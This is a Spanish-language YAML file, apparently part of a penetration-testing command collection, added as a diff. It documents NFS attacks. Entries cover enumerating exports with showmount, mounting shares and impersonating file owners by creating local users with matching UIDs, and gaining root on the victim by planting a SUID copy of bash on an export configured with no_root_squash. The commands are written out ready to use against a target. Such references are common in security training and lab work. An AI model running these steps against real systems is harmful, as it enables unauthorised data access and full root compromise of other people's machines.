@@ -1,0 +1,39 @@
+# Comandos de NFS (nfs-common): exports, montaje y root_squash.
+tool: nfs-common
+area: recon
+url: https://linux.die.net/man/8/showmount
+commands:
+  - id: nfs-showmount
+    title: Qué exporta un servidor NFS y a quién
+    cmd: |
+      showmount -e {{RHOST}}
+    phase: enum
+    tags: [nfs]
+    notes: >-
+      Cada línea es una carpeta exportada y las redes que pueden montarla. Un * significa cualquiera;
+      una red tuya, que puedes montarla sin más.
+    refs: [https://linux.die.net/man/8/showmount]
+
+  - id: nfs-mount
+    title: Montar un export NFS
+    cmd: |
+      sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3,nolock {{RHOST}}:/srv/share /mnt/nfs
+    phase: exfil
+    tags: [nfs]
+    notes: >-
+      Cambia /srv/share por la ruta de showmount. NFSv3 confía en el UID del cliente: si los archivos
+      son de un UID que no tienes, crea un usuario local con ese UID (useradd -u) y los leerás.
+    refs: [https://linux.die.net/man/8/mount.nfs]
+
+  - id: nfs-no-root-squash
+    title: Root con un export sin root_squash
+    cmd: |
+      sudo cp /bin/bash /mnt/nfs/p3ibash && sudo chmod u+s /mnt/nfs/p3ibash
+    phase: privesc
+    area: privesc-linux
+    tags: [nfs, suid]
+    notes: >-
+      Si el export tiene no_root_squash (mira /etc/exports en la víctima), lo que crees como root en
+      tu máquina es de root también allí. Luego, en la víctima, /srv/share/p3ibash -p. La bash de tu
+      Kali puede no funcionar en un sistema antiguo: copia la del propio objetivo.
+    refs: [https://linux.die.net/man/5/exports]
